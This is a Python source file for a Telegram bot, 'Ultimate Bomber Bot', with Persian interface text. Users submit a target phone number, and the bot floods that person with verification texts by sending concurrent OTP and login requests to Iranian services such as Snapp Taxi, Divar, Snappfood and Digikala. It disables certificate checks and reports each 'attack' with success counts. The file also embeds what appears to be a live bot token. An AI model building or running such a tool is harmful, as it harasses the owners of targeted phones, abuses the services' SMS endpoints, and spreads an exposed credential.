import os
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
import requests
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter

# دریافت توکن از محیط
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8503866458:AAHQCSoHmYRFiKbhEId49_TUtjcA24iGbA0")

class UltimateBomberTelegram:
    def __init__(self):
        self.success_count = 0
        self.failed_count = 0
        self.is_running = True
        self.working_services = []

    def setup_session(self):
        session = requests.Session()
        retry_strategy = Retry(total=2, backoff_factor=0.5)
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def format_phone(self, phone):
        clean_phone = ''.join(filter(str.isdigit, phone))
        formats = []
        
        if clean_phone.startswith('0'):
            formats.extend([
                clean_phone,
                clean_phone[1:],
                f"+98{clean_phone[1:]}",
            ])
        else:
            formats.extend([
                f"0{clean_phone}",
                clean_phone,
                f"+98{clean_phone}",
            ])
        
        return list(set(formats))

    def send_request(self, service):
        if not self.is_running:
            return

        url, data, headers, method, phone_formats, service_name, service_type = service
        
        try:
            phone_format = random.choice(phone_formats)
            formatted_data = self.format_data(data, phone_format)
            
            session = self.setup_session()
            time.sleep(random.uniform(0.1, 0.3))
            
            if method.upper() == "POST":
                response = session.post(url, json=formatted_data, headers=headers, timeout=10, verify=False)
            else:
                response = session.get(url, params=formatted_data, headers=headers, timeout=10, verify=False)

            if response.status_code in [200, 201, 202, 204]:
                self.success_count += 1
                if service_name not in self.working_services:
                    self.working_services.append(service_name)
            else:
                self.failed_count += 1

        except:
            self.failed_count += 1

    def format_data(self, data, phone):
        if isinstance(data, dict):
            formatted_data = {}
            for key, value in data.items():
                if value == "phone":
                    formatted_data[key] = phone
                elif isinstance(value, dict):
                    formatted_data[key] = self.format_data(value, phone)
                else:
                    formatted_data[key] = value
            return formatted_data
        return data

    def get_common_headers(self):
        return {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        }

    def get_sms_services(self, phone_formats):
        headers = self.get_common_headers()
        services = []

        sms_services = [
            ("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", {"cellphone": "phone"}, headers, "POST", "Snapp Taxi", "SMS"),
            ("https://api.divar.ir/v5/auth/authenticate", {"phone": "phone"}, headers, "POST", "Divar", "SMS"),
            ("https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass", {"cellphone": "phone"}, headers, "POST", "Snappfood", "SMS"),
            ("https://api.digikala.com/v1/user/authenticate/", {"username": "phone"}, headers, "POST", "Digikala", "SMS"),
        ]

        for service in sms_services:
            url, data, headers, method, name, service_type = service
            services.append((url, data, headers, method, phone_formats, name, service_type))
        
        return services

    def start_attack(self, phone, total_requests, attack_type):
        try:
            self.is_running = True
            self.success_count = 0
            self.failed_count = 0
            self.working_services = []
            
            phone_formats = self.format_phone(phone)
            services = self.get_sms_services(phone_formats)
            
            if not services:
                return {"error": "هیچ سرویسی در دسترس نیست"}
            
            start_time = time.time()
            
            # اجرای حمله
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = []
                for service in services:
                    if len(futures) >= total_requests:
                        break
                    futures.append(executor.submit(self.send_request, service))
                
                for future in as_completed(futures):
                    if not self.is_running:
                        break
                    try:
                        future.result(timeout=15)
                    except:
                        pass
            
            duration = time.time() - start_time
            
            result = {
                "success": True,
                "phone": phone,
                "duration": f"{duration:.2f} ثانیه",
                "total_requests": len(futures),
                "successful": self.success_count,
                "failed": self.failed_count,
                "success_rate": f"{(self.success_count/len(futures))*100:.1f}%" if len(futures) > 0 else "0%",
                "working_services": self.working_services[:5]
            }
            
            return result
            
        except Exception as e:
            return {"error": f"خطا: {str(e)}"}
    
    def stop_attack(self):
        self.is_running = False

# ایجاد نمونه بمب‌افکن
bomber = UltimateBomberTelegram()
user_sessions = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_sessions[user_id] = {"phone": None, "attack_type": None, "requests": 50}
    
    welcome_text = """
🤖 **Ultimate Bomber Bot** 

**دستورات:**
/bomb - شروع حمله جدید
/stop - توقف حمله  
/status - وضعیت فعلی
/help - راهنمای کامل
"""
    
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

async def bomb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in user_sessions:
        user_sessions[user_id] = {"phone": None, "attack_type": None, "requests": 50}
    
    if context.args:
        phone = context.args[0]
        user_sessions[user_id]["phone"] = phone
        await ask_attack_type(update, context)
        return
    
    await update.message.reply_text("📱 لطفا شماره تلفن را وارد کنید:")

async def ask_attack_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📱 فقط SMS", callback_data="sms")],
        [InlineKeyboardButton("💣 هر دو", callback_data="both")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🎯 نوع حمله:", reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data
    
    if data in ["sms", "both"]:
        user_sessions[user_id]["attack_type"] = data
        await start_attack(query, context)

async def start_attack(update, context: ContextTypes.DEFAULT_TYPE):
    if hasattr(update, 'message'):
        message = update.message
        user_id = update.effective_user.id
    else:
        message = update.callback_query.message
        user_id = update.callback_query.from_user.id
    
    user_data = user_sessions.get(user_id, {})
    phone = user_data.get("phone")
    
    if not phone:
        await message.reply_text("❌ شماره تنظیم نشده!")
        return
    
    status_message = await message.reply_text("⏳ در حال اجرای حمله...")
    
    try:
        result = bomber.start_attack(phone, 50, "sms")
        
        if "error" in result:
            await status_message.edit_text(f"❌ {result['error']}")
        else:
            result_text = f"""
✅ **حمله تکمیل شد!**

📞 شماره: {result['phone']}
⏱️ زمان: {result['duration']}
📊 درخواست: {result['total_requests']}
✅ موفق: {result['successful']}
❌ ناموفق: {result['failed']}
🎯 موفقیت: {result['success_rate']}
"""
            await status_message.edit_text(result_text)
            
    except Exception as e:
        await status_message.edit_text(f"❌ خطا: {str(e)}")

async def stop_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bomber.stop_attack()
    await update.message.reply_text("🛑 متوقف شد")

async def status_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    status_text = f"""
📊 **وضعیت:**

✅ موفق: {bomber.success_count}
❌ ناموفق: {bomber.failed_count}
"""
    await update.message.reply_text(status_text)

async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
📖 **راهنما:**

/bomb شماره - شروع حمله
/stop - توقف
/status - وضعیت
"""
    await update.message.reply_text(help_text)

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if user_id not in user_sessions:
        user_sessions[user_id] = {"phone": None, "attack_type": None, "requests": 50}
    
    if any(c.isdigit() for c in text) and len(text) >= 10:
        user_sessions[user_id]["phone"] = text
        await ask_attack_type(update, context)
    else:
        await update.message.reply_text("❌ شماره معتبر نیست")

def main():
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", bomb_handler))
    app.add_handler(CommandHandler("stop", stop_handler))
    app.add_handler(CommandHandler("status", status_handler))
    app.add_handler(CommandHandler("help", help_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("🤖 ربات فعال شد...")
    app.run_polling()

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    main()
